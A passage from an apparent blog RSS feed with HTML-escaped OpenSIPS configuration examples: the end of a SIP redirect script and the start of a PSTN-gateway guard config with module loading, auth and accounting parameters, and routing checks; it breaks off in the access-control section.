&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	rewriteuri&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;sip:parallel@siphub.net:9&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# append one more URI to the destination ser&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	append_branch&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;sip:redirect@siphub.net:9&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# redirect now&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	sl_send_reply&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;300&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Redirect&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>pstn</title>
      <link>https://wdd.js.org/opensips/ch8/pstn/</link>
      <pubDate>Thu, 28 May 2020 10:00:46 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch8/pstn/</guid>
      <description>&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-makefile&#34; data-lang=&#34;makefile&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# $Id$
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# example: ser configured as PSTN gateway guard; PSTN gateway is located
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# at 192.168.0.10
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# ------------------ module loading ----------------------------------
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#set module path
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;mpath&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/usr/local/lib/opensips/modules/&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;loadmodule&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;sl.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;loadmodule&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;tm.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;loadmodule&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;acc.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;loadmodule&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;rr.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;loadmodule&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;maxfwd.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;loadmodule&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;db_mysql.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;loadmodule&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;auth.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;loadmodule&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;auth_db.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;loadmodule&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;group.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;loadmodule&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;uri.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# ----------------- setting module-specific parameters ---------------
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;modparam(&amp;#34;auth_db&amp;#34;, &amp;#34;db_url&amp;#34;,&amp;#34;mysql&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;//opensips:opensipsrw@localhost/opensips&amp;#34;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;modparam(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;auth_db&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;calculate_ha1&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;yes)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;modparam(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;auth_db&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;password_column&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;password&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# -- acc params --
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;modparam(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;acc&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;log_level&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;1)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# that is the flag for which we will account -- don&amp;#39;t forget to
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# set the same one :-)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;modparam(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;acc&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;log_flag&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# -------------------------  request routing logic -------------------
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# main routing logic
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;route{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;/*&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;*********&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;ROUTINE&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;CHECKS&lt;/span&gt;  &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;**********************************&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;*/&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# filter too old messages
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;!mf_process_maxfwd_header&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;10&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		log&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;LOG: Too many hops\n&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		sl_send_reply&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;483&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Too Many Hops&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;$ml &amp;gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2048&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		sl_send_reply&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;513&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Message too big&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	/* ********* RR ********************************** */
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	/* grant Route routing &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; route headers present */
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;loose_route&lt;span style=&#34;color:#f92672&#34;&gt;())&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt; t_relay&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;; exit; &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	/* record-route INVITEs -- all subsequent requests must visit us */
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;$rm&lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;INVITE&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		record_route&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# now check if it really is a PSTN destination which should be handled&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# by our gateway; if not, and the request is an invitation, drop it --&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# we cannot terminate it in PSTN; relay non-INVITE requests -- it may&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# be for example BYEs sent by gateway to call originator&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;!$ru&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;~&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;sip:\+?[0-9]+@.*&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;$rm&lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;INVITE&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			sl_send_reply&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;403&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Call cannot be served here&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			forward&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# account completed transactions via syslog&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	setflag&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;1&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# free call destinations ... no authentication needed&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt; is_user_in&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Request-URI&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;free-pstn&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;  /* free destinations */
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt;  $ru&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;~&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;sip:[79][0-9][0-9][0-9]@.*&amp;#34;&lt;/span&gt;  /* local PBX */
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; $ru&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;~&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;sip:98[0-9][0-9][0-9][0-9]&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		log&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;free call&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;$si&lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;192.168.0.10&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;# our gateway doesn&amp;#39;t support digest authentication;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;# verify that a request is coming from it by source&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;# address&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		log&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;gateway-originated request&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;# in all other cases, we need to check the request against&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;# access control lists; first of all, verify request&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;# originator&amp;#39;s identity&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
